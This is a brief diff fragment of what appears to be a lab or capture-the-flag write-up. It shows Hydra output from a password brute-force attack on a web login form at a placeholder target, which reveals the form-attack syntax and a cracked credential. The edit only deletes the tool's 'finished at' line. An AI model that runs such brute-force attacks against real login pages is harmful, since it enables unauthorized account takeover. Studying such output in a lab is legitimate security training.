@@ -40,6 +40,5 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-11 20:12:
 [DATA] attacking http-post-form://<TARGET_IP>:5000/login:username=^USER^&password=^PASS^:F=incorrect
 [5000][http-post-form] host: <TARGET_IP>   login: alice   password: password123
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-11 20:13:05
 ```
 
